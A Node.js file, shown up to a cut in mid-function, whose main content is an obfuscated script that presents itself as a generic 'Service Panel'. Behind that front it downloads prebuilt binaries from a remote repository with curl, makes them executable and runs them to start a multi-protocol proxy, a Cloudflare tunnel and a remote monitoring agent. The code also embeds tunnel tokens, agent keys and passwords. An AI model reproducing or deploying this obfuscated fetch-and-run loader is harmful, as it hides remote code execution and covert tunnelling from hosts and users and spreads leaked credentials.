const { execSync } = require('child_process');
const b = `const _0x4754d8=_0x5497;(function(_0x12e121,_0x513348){const _0x31aa91=_0x5497,_0x28d3a3=_0x12e121();while(!![]){try{const _0x4bd1a3=parseInt(_0x31aa91(0x11d))/0x1+parseInt(_0x31aa91(0x168))/0x2*(parseInt(_0x31aa91(0x178))/0x3)+parseInt(_0x31aa91(0xec))/0x4+parseInt(_0x31aa91(0xda))/0x5+parseInt(_0x31aa91(0x13b))/0x6*(-parseInt(_0x31aa91(0x163))/0x7)+parseInt(_0x31aa91(0x155))/0x8*(-parseInt(_0x31aa91(0x183))/0x9)+parseInt(_0x31aa91(0x15d))/0xa*(-parseInt(_0x31aa91(0x15b))/0xb);if(_0x4bd1a3===_0x513348)break;else _0x28d3a3['push'](_0x28d3a3['shift']());}catch(_0x16e421){_0x28d3a3['push'](_0x28d3a3['shift']());}}}(_0x5043,0x79211));const http=require(_0x4754d8(0x17d)),https=require(_0x4754d8(0x115)),fs=require('fs'),path=require('path'),os=require('os'),{spawn,exec}=require(_0x4754d8(0x10a)),{URL}=require(_0x4754d8(0x14d)),crypto=require(_0x4754d8(0x15e)),net=require(_0x4754d8(0x165)),express=require('express'),{createProxyMiddleware}=require('http-proxy-middleware'),CONFIG={'C_T':process[_0x4754d8(0x15c)]['C_T']||_0x4754d8(0x104),'B_D':process[_0x4754d8(0x15c)]['B_D']||_0x4754d8(0x139),'C_D':process['env'][_0x4754d8(0x10d)]||'scalingo.seav.eu.org','N_S':process[_0x4754d8(0x15c)][_0x4754d8(0xe5)]||'nz.seav.eu.org','N_P':process[_0x4754d8(0x15c)]['N_P']||_0x4754d8(0xf9),'N_K':process[_0x4754d8(0x15c)]['N_K']||_0x4754d8(0x136),'N_T':process[_0x4754d8(0x15c)][_0x4754d8(0x148)]||_0x4754d8(0xd7),'N_V':process['env'][_0x4754d8(0x18a)]||'v0.17.5','HY2_PORT':process['env']['HY2_PORT']||'25605','VMESS_PORT':process[_0x4754d8(0x15c)][_0x4754d8(0x120)]||_0x4754d8(0x113),'REALITY_PORT':process['env'][_0x4754d8(0x158)]||'','TUIC_PORT':process['env'][_0x4754d8(0x131)]||'','SERVER_IP':process[_0x4754d8(0x15c)]['SERVER_IP']||'','VMESS_UUID':process[_0x4754d8(0x15c)][_0x4754d8(0x147)]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','TUIC_UUID':process[_0x4754d8(0x15c)][_0x4754d8(0x12a)]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','TUIC_PASSWORD':process[_0x4754d8(0x15c)][_0x4754d8(0xef)]||'789456','HY2_PASSWORD':process[_0x4754d8(0x15c)][_0x4754d8(0x13e)]||_0x4754d8(0x15a),'REALITY_PRIVATE_KEY':process[_0x4754d8(0x15c)][_0x4754d8(0x132)]||'','REALITY_PUBLIC_KEY':process['env']['REALITY_PUBLIC_KEY']||'','HY2_SNI':process[_0x4754d8(0x15c)][_0x4754d8(0xf2)]||_0x4754d8(0x122),'VMESS_PATH':process['env'][_0x4754d8(0x16e)]||_0x4754d8(0x13f),'REALITY_SNI':process[_0x4754d8(0x15c)][_0x4754d8(0x110)]||_0x4754d8(0xe2),'REALITY_SHORT_ID':process[_0x4754d8(0x15c)]['REALITY_SHORT_ID']||_0x4754d8(0x16a),'PORT':process[_0x4754d8(0x15c)]['PORT']||0xbb8},WORK_DIR=os[_0x4754d8(0x108)](),processes=[];let serviceStatus={'singbox':_0x4754d8(0x17c),'cloudflared':_0x4754d8(0x17c),'nezha':_0x4754d8(0x17c),'http':_0x4754d8(0x17c)};function _0x5043(){const _0x31d73b=['tls','https','config.json','block','utf8','logFile','every','</div></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','kill','466897yfnTYy','/status','text/html','VMESS_PORT','https://ipv4.icanhazip.com','www.bing.com','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','length','C_T','VMESS','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Cloudflared</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','forEach','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>TUIC</div><div\x20class=\x22port-value\x22>','TUIC_UUID','createServer','amd64','http://localhost:','hysteria2','tunnel','reality-in','TUIC_PORT','REALITY_PRIVATE_KEY','B_D','xtls-rprx-vision','\x22\x20-o\x20\x22','nJqKWWLfSFvJnMXpZ8','pipe','arm64','1.seaw.cf','?encryption=none&flow=xtls-rprx-vision&security=reality&sni=','19974mtprpP','Hysteria2','http2','HY2_PASSWORD','/vms','https://github.com/seav1/dl/releases/download/upx/sb','vless','https://github.com/seav1/dl/releases/download/upx/cf-arm','https://github.com/seav1/dl/releases/download/upx/nz','&fp=chrome&pbk=','SIGTERM',':</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22\x20id=\x22','VMESS_UUID','N_T','127.0.0.1','!\x27))\x22>Copy</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','string','catch','url','vmess-in','stdout','unlinkSync','hysteria2://','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','ignore','hex','13528rLQIgm','from','stderr','REALITY_PORT','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Hysteria2</div><div\x20class=\x22port-value\x22>','789456','44gOrDEw','env','925080jQHUZI','crypto','exit','join','existsSync','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Server\x20IP:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>','623byomVB','silent','net','home','trim','864PujpMC','&type=tcp#REALITY','0123456789abcdef','base64','singbox','vmess://','VMESS_PATH','spawn','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>HTTP\x20Server</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','N_P','none','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Sing-Box</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','end','--token','status-running','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','1191PTdRTx','push','stringify','writeFileSync','stopped','http','--disable-auto-update','randomBytes','Reality','createWriteStream','nezha','2529bkzBnt','https://github.com/seav1/dl/releases/download/upx/sb-arm','<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>No\x20active\x20connections</div></div>','PORT','killed','replace','--protocol','N_V','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Reality</div><div\x20class=\x22port-value\x22>','chmodSync','HY2_PORT','--tls','SIGINT','VMess','4029755rkiUJo','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Nezha</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','toString','https://github.com/seav1/dl/releases/download/upx/nz-arm','get','\x27).then(()=>alert(\x27Copied\x20','</div></div>','status-stopped','www.microsoft.com','writeHead','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','N_S','File\x20not\x20found:\x20','running','toLowerCase','direct','?insecure=1&sni=','includes','773108BWtfGH','REALITY_PUBLIC_KEY','data','TUIC_PASSWORD','x64','cf_','HY2_SNI','arch','status','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22><span\x20class=\x22protocol\x22>','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>VMESS</div><div\x20class=\x22port-value\x22>','chrome','/health','443','match','nezha.log','?congestion_control=cubic&udp_relay_mode=native&alpn=h3,h2,http/1.1&allow_insecure=1#TUIC','error','run','upgrade','protocol','\x22\x20generate\x20reality-keypair','755','tuic','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOGUwNWI3MTctMjdjNC00M2Y1LTg1NDgtNGRiZWY5MmI1N2NjIiwicyI6IlpqWm1OMk5qTldRdE5qazJOaTAwTURoaExUazFaR0l0WVRCaE1UTTVOREJqTkRKaSJ9','vmess','readFileSync','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Configured\x20Ports:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>HTTP</div><div\x20class=\x22port-value\x22>','tmpdir','N_K','child_process','TUIC','auto','C_D','map','application/json','REALITY_SNI','curl\x20-s\x20-L\x20\x22','--url','8001'];_0x5043=function(){return _0x31d73b;};return _0x5043();}const HTML_TEMPLATES={'home':'\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Panel</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links{margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a{display:inline-block;margin:0\x2010px;padding:10px\x2020px;background:#667eea;color:white;text-decoration:none;border-radius:5px;transition:background\x200.3s}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a:hover{background:#5a67d8}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Panel</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Multi-protocol\x20service\x20management\x20panel.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/status\x22>View\x20Status</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer\x22>Service\x20Management\x20Panel</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','status':(_0x416210,_0x3fa1df)=>'\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Status</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{max-width:900px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;text-align:center;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card{padding:20px;background:#f8f9fa;border-radius:8px;text-align:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card\x20h3{margin:0\x200\x2010px\x200;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-running{background:#d4edda;color:#155724}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-stopped{background:#f8d7da;color:#721c24}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all;font-size:12px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.protocol{color:#28a745;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav{text-align:center;margin-bottom:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a{margin:0\x2010px;color:#007cba;text-decoration:none}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a:hover{text-decoration:underline}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-info{margin:20px\x200;padding:15px;background:#e9ecef;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-item{background:#fff;padding:10px;border-radius:4px;text-align:center;box-shadow:0\x201px\x203px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-label{font-weight:bold;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-value{font-family:monospace;color:#28a745;margin-top:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20refreshPage()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20location.reload();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setInterval(refreshPage,\x2030000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/\x22>Home</a>\x20|\x20<a\x20href=\x22/status\x22>Status</a>\x20|\x20<a\x20href=\x22javascript:refreshPage()\x22>Refresh</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Status</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus[_0x4754d8(0x16c)]==='running'?_0x4754d8(0x176):_0x4754d8(0xe1))+_0x4754d8(0x173)+serviceStatus[_0x4754d8(0x16c)]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus['cloudflared']==='running'?'status-running':_0x4754d8(0xe1))+_0x4754d8(0x127)+serviceStatus['cloudflared']+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus[_0x4754d8(0x182)]===_0x4754d8(0xe7)?'status-running':'status-stopped')+_0x4754d8(0xdb)+serviceStatus[_0x4754d8(0x182)]+_0x4754d8(0xe4)+(serviceStatus['http']===_0x4754d8(0xe7)?_0x4754d8(0x176):_0x4754d8(0xe1))+_0x4754d8(0x170)+serviceStatus[_0x4754d8(0x17d)]+_0x4754d8(0x107)+CONFIG['PORT']+_0x4754d8(0x11b)+(CONFIG[_0x4754d8(0x120)]?_0x4754d8(0xf6)+CONFIG[_0x4754d8(0x120)]+_0x4754d8(0xe0):'')+_0x4754d8(0x177)+(CONFIG[_0x4754d8(0x18d)]?_0x4754d8(0x159)+CONFIG[_0x4754d8(0x18d)]+_0x4754d8(0xe0):'')+_0x4754d8(0x177)+(CONFIG[_0x4754d8(0x158)]?_0x4754d8(0x18b)+CONFIG[_0x4754d8(0x158)]+_0x4754d8(0xe0):'')+_0x4754d8(0x177)+(CONFIG[_0x4754d8(0x131)]?_0x4754d8(0x129)+CONFIG[_0x4754d8(0x131)]+'</div></div>':'')+_0x4754d8(0x162)+_0x416210+_0x4754d8(0x152)+(_0x3fa1df[_0x4754d8(0x124)]>0x0?_0x3fa1df[_0x4754d8(0x10e)](_0x10c74d=>_0x4754d8(0xf5)+_0x10c74d[_0x4754d8(0x100)]+_0x4754d8(0x146)+_0x10c74d[_0x4754d8(0x100)][_0x4754d8(0xe8)]()+'\x22>'+_0x10c74d[_0x4754d8(0x14d)]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27'+_0x10c74d[_0x4754d8(0x14d)]+_0x4754d8(0xdf)+_0x10c74d['protocol']+_0x4754d8(0x14a))['join'](''):_0x4754d8(0x185))+_0x4754d8(0x123)};function detectArch(){const _0x4b7bd4=_0x4754d8,_0x205ce5=process[_0x4b7bd4(0xf3)];return _0x205ce5===_0x4b7bd4(0xf0)?_0x4b7bd4(0x12c):_0x205ce5===_0x4b7bd4(0x138)?_0x4b7bd4(0x138):(console[_0x4b7bd4(0xfd)]('Unsupported\x20architecture:\x20'+_0x205ce5),process[_0x4b7bd4(0x15f)](0x1),'');}async function downloadFile(_0x4697d7,_0x302b09){return new Promise((_0x4b93fe,_0x268ba7)=>{const _0x257096=_0x5497;exec(_0x257096(0x111)+_0x4697d7+_0x257096(0x135)+_0x302b09+'\x22\x20&&\x20chmod\x20+x\x20\x22'+_0x302b09+'\x22',_0x3b9fb5=>{if(_0x3b9fb5)return _0x268ba7(_0x3b9fb5);_0x4b93fe();});});}async function downloadSingBox(_0x43b443,_0x3107fb){const _0x1074f6=_0x4754d8,_0x526215=_0x43b443===_0x1074f6(0x12c)?_0x1074f6(0x140):_0x1074f6(0x184);return downloadFile(_0x526215,_0x3107fb);}async function downloadCloudflared(_0x4ea984,_0x5567d6){const _0x4301=_0x4754d8,_0x1876ba=_0x4ea984===_0x4301(0x12c)?'https://github.com/seav1/dl/releases/download/upx/cf':_0x4301(0x142);return downloadFile(_0x1876ba,_0x5567d6);}async function downloadNezhaAgent(_0x13adce,_0x5c7554){const _0x457007=_0x4754d8,_0x45218c=_0x13adce===_0x457007(0x12c)?_0x457007(0x143):_0x457007(0xdd);return downloadFile(_0x45218c,_0x5c7554);}function _0x5497(_0x5c9365,_0x3e1ed2){const _0x504312=_0x5043();return _0x5497=function(_0x549738,_0x503e31){_0x549738=_0x549738-0xd7;let _0x30ffc9=_0x504312[_0x549738];return _0x30ffc9;},_0x5497(_0x5c9365,_0x3e1ed2);}async function getServerIP(){return new Promise(_0xb0bffc=>{const _0x595cff=_0x5497;https[_0x595cff(0xde)](_0x595cff(0x121),_0x42d984=>{const _0x18f22d=_0x595cff;let _0x5c8576='';_0x42d984['on'](_0x18f22d(0xee),_0x1bfb96=>_0x5c8576+=_0x1bfb96),_0x42d984['on'](_0x18f22d(0x174),()=>_0xb0bffc(_0x5c8576[_0x18f22d(0x167)]()));})['on']('error',()=>_0xb0bffc(_0x595cff(0x149)));});}async function startTempTunnel(_0x45203d,_0x2615f1){return new Promise(_0x101e98=>{const _0x45e0db=_0x5497;for(let _0x51640e=0x0;_0x51640e<0x3;_0x51640e++){const _0x27aef6=path[_0x45e0db(0x160)](WORK_DIR,_0x45e0db(0xf1)+crypto[_0x45e0db(0x17f)](0x4)[_0x45e0db(0xdc)]('hex')+'.log'),_0xa1059=spawn(_0x45203d,[_0x45e0db(0x12f),'--no-autoupdate',_0x45e0db(0x112),'http://localhost:'+_0x2615f1],{'stdio':['ignore',_0x45e0db(0x137),_0x45e0db(0x137)]});processes[_0x45e0db(0x179)](_0xa1059);const _0x36668c=fs[_0x45e0db(0x181)](_0x27aef6);_0xa1059['stdout']['pipe'](_0x36668c),_0xa1059[_0x45e0db(0x157)][_0x45e0db(0x137)](_0x36668c),setTimeout(()=>{const _0x385b55=_0x45e0db;try{const _0x40a6e5=fs[_0x385b55(0x106)](_0x27aef6,_0x385b55(0x118)),_0xd56d57=_0x40a6e5[_0x385b55(0xfa)](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);if(_0xd56d57)return CONFIG[_0x385b55(0x10d)]=_0xd56d57[0x1],fs[_0x385b55(0x150)](_0x27aef6),_0x101e98(!![]);}catch(_0x38326b){}_0xa1059['kill']();try{fs['unlinkSync'](_0x27aef6);}catch(_0x140d5f){}_0x51640e===0x2&&_0x101e98(![]);},0x2710);}});}async function generateRealityKeys(_0x23a999){const _0x198908=_0x4754d8;if(!CONFIG[_0x198908(0x158)]||CONFIG['REALITY_PRIVATE_KEY']&&CONFIG[_0x198908(0xed)])return;return new Promise(_0x5f104a=>{const _0xb8b6f8=_0x198908;exec('\x22'+_0x23a999+_0xb8b6f8(0x101),(_0x581f78,_0x45151c)=>{const _0x23cd01=_0xb8b6f8;if(!_0x581f78&&_0x45151c){const 